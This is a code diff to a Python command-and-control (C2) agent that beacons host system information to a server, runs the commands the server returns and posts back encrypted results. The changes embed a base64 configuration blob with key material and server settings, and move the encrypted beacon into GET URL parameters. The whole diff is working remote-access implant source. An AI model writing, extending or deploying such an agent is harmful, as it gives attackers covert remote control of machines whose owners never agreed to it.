@@ -8,10 +8,41 @@ import platform
 import subprocess
 import requests
 import uuid
+import base64
 from datetime import datetime
-from typing import Dict, Any, Optional
-from configure import load_config, read_binary_config
+from typing import Dict, Any, Optional, Tuple
 from crypto import encrypt, decrypt
+
+# Static base64-encoded configuration data (528 bytes total)
+# This will be replaced during agent configuration
+CONFIG_B64 = "nULNhMUXxgelPhJgBUmdkblug98UYPc/4sx2tB9weXsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM0QgnCsmUB2fpJLGYhBBGea9lx4jJXZpCugs1EVFQTcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB7InNlcnZlcl91cmwiOiAiaHR0cDovL2xvY2FsaG9zdDo4MDgwIiwgImRlcGxveV9pZCI6ICJhZ2VudDAwMSIsICJjYWxsYmFja19pbnRlcnZhbCI6IDMwLCAiYzJfcHVibGljX2tleSI6ICI0ZDJjYTE5N2U4MTNjZWViMWI3ZmQ0MzQ2MTI5NWNmZThmZGM5NDIyY2ViOTY4NjE2ZDRjMjQ2YzEyNTczZTQyIn0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+CONFIG_SIZE = 528
+KEYPAIR_SIZE = 128
+MAX_JSON_SIZE = 400
+
+def load_config(config_data: bytes) -> Tuple[bytes, bytes, Dict[str, Any]]:
+    """Load and parse agent configuration"""
+    if len(config_data) != CONFIG_SIZE:
+        raise ValueError(f"Invalid configuration size: {len(config_data)} != {CONFIG_SIZE}")
+    
+    # Extract keypair (first 128 bytes)
+    agent_public_key = config_data[:64].rstrip(b'\x00')
+    agent_private_key = config_data[64:128].rstrip(b'\x00')
+    
+    # Extract and parse JSON (remaining 400 bytes)
+    json_data = config_data[128:].rstrip(b'\x00')
+    config_dict = json.loads(json_data.decode('utf-8'))
+    
+    # Convert c2_public_key back from hex
+    config_dict['c2_public_key'] = bytes.fromhex(config_dict['c2_public_key'])
+    
+    return agent_public_key, agent_private_key, config_dict
+
+def get_static_config() -> Tuple[bytes, bytes, Dict[str, Any]]:
+    """Get configuration from static base64 string"""
+    config_data = base64.b64decode(CONFIG_B64)
+    return load_config(config_data)
 
 def get_system_info() -> Dict[str, Any]:
     """Collect system information for beacon"""
@@ -87,18 +118,23 @@ def execute_command(command: str) -> str:
         return f"Error executing command: {str(e)}"
 
 def send_beacon(server_url: str, deploy_id: str, agent_private_key: bytes, c2_public_key: bytes) -> Optional[Dict[str, Any]]:
-    """Send beacon to C2 server and get task"""
+    """Send beacon to C2 server and get task using GET with agent ID and encrypted status"""
     system_info = get_system_info()
     system_info["deploy_id"] = deploy_id
     
     beacon_data = json.dumps(system_info).encode('utf-8')
     encrypted_beacon = encrypt(beacon_data, c2_public_key, agent_private_key)
     
+    # Encode encrypted status as base64 for URL parameter
+    encoded_status = base64.b64encode(encrypted_beacon).decode('ascii')
+    
     try:
-        response = requests.post(
+        response = requests.get(
             f"{server_url}/beacon",
-            data=encrypted_beacon,
-            headers={"Content-Type": "application/octet-stream"},
+            params={
+                "id": deploy_id,
+                "status": encoded_status
+            },
             timeout=10
         )
         
@@ -113,9 +149,11 @@ def send_beacon(server_url: str, deploy_id: str, agent_private_key: bytes, c2_pu
     return None
 
 def send_task_result(server_url: str, task_result: Dict[str, Any], agent_private_key: bytes, c2_public_key: bytes) -> None:
-    """Send task execution result back to C2"""
-    result_data = json.dumps(task_result).encode('utf-8')
-    encrypted_result = encrypt(result_data, c2_public_key, agent_private_key)
+    """Send task execution result back to C2 with base64 encoding"""
+    # Base64 encode the result data before encryption
+    result_json = json.dumps(task_result)
+    result_b64 = base64.b64encode(result_json.encode('utf-8')).decode('ascii')
+    encrypted_result = encrypt(result_b64.encode('utf-8'), c2_public_key, agent_private_key)
     
     try:
         requests.post(
@@ -127,18 +165,10 @@ def send_task_result(server_url: str, task_result: Dict[str, Any], agent_private
     except Exception as e:
         print(f"Result send failed: {e}")
 
-def main_loop(config_path: str = None) -> None:
+def main_loop() -> None:
     """Main agent loop"""
-    # Load configuration from binary or file
-    if config_path:
-        with open(config_path, 'rb') as f:
-            config_data = f.read()
-    else:
-        # Try to read from end of current executable
-        import sys
-        config_data = read_binary_config(sys.argv[0])
-    
-    agent_public_key, agent_private_key, config = load_config(config_data)
+    # Load configuration from static base64 string
+    agent_public_key, agent_private_key, config = get_static_config()
     
     server_url = config['server_url'].rstrip('/')
     deploy_id = config['deploy_id']
@@ -178,6 +208,4 @@ def main_loop(config_path: str = None) -> None:
         time.sleep(callback_interval)
 
 if __name__ == "__main__":
-    import sys
-    config_path = sys.argv[1] if len(sys.argv) > 1 else None
-    main_loop(config_path)
+    main_loop()
